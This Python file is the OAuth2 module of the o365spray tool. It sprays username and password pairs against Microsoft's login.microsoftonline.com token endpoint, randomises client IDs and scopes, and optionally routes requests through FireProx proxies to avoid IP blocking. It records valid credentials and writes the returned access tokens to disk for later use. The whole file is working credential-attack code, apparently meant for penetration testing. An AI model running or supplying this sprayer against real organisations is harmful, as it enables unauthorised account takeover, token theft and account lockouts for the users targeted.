#!/usr/bin/env python3

import json
import logging
import time

from o365spray.core.handlers.sprayer.modules.base import SprayerBase
from o365spray.core.utils import (
    Defaults,
    Helper,
    text_colors,
)


class SprayModule_oauth2(SprayerBase):
    """oAuth2 Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_oauth2, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via Microsoft's oAuth2 endpoint

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.locked_limit:
                raise ValueError("Locked account limit reached.")

            # Grab prebuilt office headers
            headers = Defaults.HTTP_HEADERS
            headers["Accept"] = "application/json"
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Grab these values and include them in the tested output for logging
            resource = Helper.get_random_element_from_list(Defaults.RESOURCES)
            client_id = Helper.get_random_element_from_list(Defaults.CLIENT_IDS)

            # Write the tested user
            tested = f"{email}:{password} | {client_id} | {resource}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Scope, resource, client_id must be valid for authentication
            # to complete
            scope = Helper.get_random_sublist_from_list(Defaults.SCOPES)
            data = {
                "resource": resource,
                "client_id": client_id,
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": " ".join(scope),
            }

            # Handle FireProx API URL
            if self.proxy_url:
                proxy_url = self.proxy_url.rstrip("/")
                url = f"{proxy_url}/common/oauth2/token"

                # Update headers
                headers = Helper.fireprox_headers(headers)

            else:
                url = "https://login.microsoftonline.com/common/oauth2/token"

            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )

            status = response.status_code
            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

                # If a token was returned, attempt to write the token
                # to disk for future use
                try:
                    token_file = f"{self.output_dir}{email}.token.json"
                    with open(token_file, "w") as f:
                        json.dump(response.json(), f)

                except:
                    pass

            else:
                # Handle Microsoft AADSTS errors
                body = response.json()
                error = body["error_description"].split("\r\n")[0]
                self._check_aadsts(
                    user,
                    email,
                    password,
                    error,
                )

        except Exception as e:
            logging.debug(e)
            pass
